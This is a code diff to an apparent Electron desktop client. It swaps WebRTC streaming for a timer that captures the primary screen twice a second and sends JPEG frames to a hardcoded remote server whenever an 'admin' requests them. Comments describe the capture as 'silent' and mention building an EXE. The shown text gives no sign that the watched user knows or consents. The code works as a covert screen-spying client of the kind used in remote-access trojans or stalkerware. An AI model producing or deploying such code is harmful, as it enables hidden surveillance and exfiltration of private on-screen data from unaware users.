@@ -6,17 +6,8 @@
 const SERVER_URL = "https://cml-0v9b.onrender.com"; // REPLACE THIS BEFORE BUILDING EXE!
 
 let socket;
-let peerConnection;
-const configuration = { 
-    iceServers: [
-        { urls: 'stun:stun.l.google.com:19302' },
-        { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject', credential: 'openrelayproject' },
-        { urls: 'turn:openrelay.metered.ca:443', username: 'openrelayproject', credential: 'openrelayproject' },
-        { urls: 'turn:openrelay.metered.ca:443?transport=tcp', username: 'openrelayproject', credential: 'openrelayproject' }
-    ] 
-};
 let localStream;
-let iceCandidatesQueue = [];
+let screenInterval = null;
 
 window.onload = async () => {
     // Dynamically load socket.io-client from the server
@@ -37,9 +28,12 @@ window.onload = async () => {
 
         // When the admin clicks "Watch" on the dashboard
         socket.on('request-offer', async (adminId) => {
+            console.log("Received 'request-offer' from admin:", adminId);
+            socket.emit('client-error', "Received request-offer, getting screen...");
             try {
                 // Automatically get all screens
                 const sources = await window.electronAPI.getSources();
+                console.log("Screen sources found:", sources.length);
                 // Select the primary screen (first one)
                 const mainScreen = sources[0];
 
@@ -54,30 +48,28 @@ window.onload = async () => {
                     }
                 });
 
-                if (peerConnection) peerConnection.close();
-                peerConnection = new RTCPeerConnection(configuration);
-                iceCandidatesQueue = [];
+                const video = document.createElement('video');
+                video.srcObject = localStream;
+                video.play();
 
-                // Send ICE candidates to admin
-                peerConnection.onicecandidate = e => {
-                    if (e.candidate) {
-                        socket.emit('ice-candidate', { candidate: e.candidate, targetId: adminId });
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d', { alpha: false });
+
+                video.onloadedmetadata = () => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                };
+
+                if (screenInterval) clearInterval(screenInterval);
+                
+                screenInterval = setInterval(() => {
+                    if (video.videoWidth > 0 && video.videoHeight > 0) {
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        // Send JPEG frame with 0.5 quality for performance
+                        const frame = canvas.toDataURL('image/jpeg', 0.5);
+                        socket.emit('screen-frame', { frame: frame, targetId: adminId });
                     }
-                };
-
-                peerConnection.onconnectionstatechange = () => {
-                    socket.emit('client-error', "WebRTC State: " + peerConnection.connectionState);
-                };
-
-                // Add the screen video track
-                localStream.getTracks().forEach(track => {
-                    peerConnection.addTrack(track, localStream);
-                });
-
-                // Create and send WebRTC offer
-                const offer = await peerConnection.createOffer();
-                await peerConnection.setLocalDescription(offer);
-                socket.emit('offer', { offer: offer, targetId: adminId });
+                }, 500); // 2 frames per second for monitoring
 
             } catch (e) {
                 console.error("Silent screen capture failed", e);
@@ -85,28 +77,13 @@ window.onload = async () => {
             }
         });
 
-        socket.on('answer', async (data) => {
-            await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
-            
-            // Process queued candidates
-            for (let candidate of iceCandidatesQueue) {
-                try {
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
-                } catch (err) { console.error("ICE error", err); }
-            }
-            iceCandidatesQueue = [];
-        });
-
-        socket.on('ice-candidate', async (data) => {
-            if (peerConnection) {
-                if (peerConnection.remoteDescription) {
-                    try {
-                        await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
-                    } catch (err) { console.error("ICE error", err); }
-                } else {
-                    iceCandidatesQueue.push(data.candidate);
-                }
-            }
+        socket.on('stop-watch', () => {
+             console.log("Stopping watch");
+             if (screenInterval) clearInterval(screenInterval);
+             if (localStream) {
+                 localStream.getTracks().forEach(t => t.stop());
+                 localStream = null;
+             }
         });
     };
 
